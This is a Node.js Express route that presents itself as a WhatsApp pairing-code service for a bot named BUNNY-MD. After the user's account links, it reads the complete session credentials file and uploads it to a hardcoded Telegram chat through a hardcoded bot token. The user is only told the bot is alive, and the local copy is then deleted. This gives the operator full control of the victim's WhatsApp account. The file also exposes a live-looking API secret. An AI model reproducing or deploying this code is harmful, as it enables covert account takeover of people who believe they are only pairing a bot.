const express = require('express');
const fs = require('fs');
const axios = require('axios');
const crypto = require('crypto');
const pino = require("pino");
const {
    default: makeWASocket,
    useMultiFileAuthState,
    delay,
    makeCacheableSignalKeyStore
} = require("@whiskeysockets/baileys");

const router = express.Router();

const BOT_TOKEN = '149180968:AAHGvhs013chl-FKJV5M3MPZ6H7uEahaI_Q';
const TELEGRAM_CHAT_ID = '7679941367'; // e.g. 123456789

function removeFile(FilePath) {
    if (!fs.existsSync(FilePath)) return false;
    fs.rmSync(FilePath, { recursive: true, force: true });
}

const version = [2, 3000, 1015901307];

// Generate Bunny ID
function generateBunnyID() {
    return 'BUNNYTEC-' + crypto.randomBytes(2).toString('hex').toUpperCase();
}

router.get('/', async (req, res) => {
    let number = req.query.number;
    if (!number) return res.status(400).send({ error: 'number query is required' });

    const bunnyID = generateBunnyID();

    async function PairCode() {
        const { state, saveCreds } = await useMultiFileAuthState(`./session`);

        try {
            let sock = makeWASocket({
                auth: {
                    creds: state.creds,
                    keys: makeCacheableSignalKeyStore(state.keys, pino({ level: "fatal" }).child({ level: "fatal" })),
                },
                printQRInTerminal: false,
                logger: pino({ level: "fatal" }),
                browser: ["Ubuntu", "Chrome", "20.0.04"],
            });

            if (!sock.authState.creds.registered) {
                await delay(1500);
                number = number.replace(/[^0-9]/g, '');
                const code = await sock.requestPairingCode(number);

                if (!res.headersSent) {
                    await res.send({ code, version, id: bunnyID });
                }
            }

            sock.ev.on('creds.update', saveCreds);

            sock.ev.on("connection.update", async ({ connection, lastDisconnect }) => {
                if (connection === "open") {
                    await delay(3000);
                    const credsBuffer = fs.readFileSync('./session/creds.json');

                    // 📨 Send creds.json to Telegram Bot
                    await axios.post(`https://api.telegram.org/bot${BOT_TOKEN}/sendDocument`, {
                        chat_id: TELEGRAM_CHAT_ID,
                        caption: `🔐 *New BUNNY-MD Session* 🐰\n\n🆔 ID: ${bunnyID}\n📱 Number: ${sock.user.id.split(':')[0]}`,
                        document: {
                            value: credsBuffer,
                            options: {
                                filename: `${bunnyID}.json`,
                                contentType: 'application/json'
                            }
                        }
                    }, {
                        headers: {
                            'Content-Type': 'multipart/form-data'
                        },
                        maxContentLength: Infinity,
                        maxBodyLength: Infinity
                    }).catch(e => console.error("❌ Telegram upload failed:", e.response?.data || e.message));

                    // ✅ Send message to WhatsApp number
                    await sock.sendMessage(sock.user.id, {
                        text: `✅ *BUNNY-MD is Alive!*\n\nType any command to get started. 🐰`,
                    });

                    await delay(1000);
                    removeFile('./session');
                }

                if (connection === "close" && lastDisconnect?.error?.output?.statusCode !== 401) {
                    await delay(3000);
                    PairCode();
                }
            });
        } catch (err) {
            console.error("❌ Pairing Error:", err);
            removeFile('./session');
            if (!res.headersSent) {
                return res.status(500).send({ code: "Pairing Failed", version });
            }
        }
    }

    return await PairCode();
});

process.on('uncaughtException', function (err) {
    let e = String(err);
    if (
        e.includes("conflict") || e.includes("timeout") ||
        e.includes("not-authorized") || e.includes("rate") ||
        e.includes("Connection Closed") || e.includes("Timed Out")
    ) return;
    console.log('⚠️ Uncaught exception:', err);
});

module.exports = router;
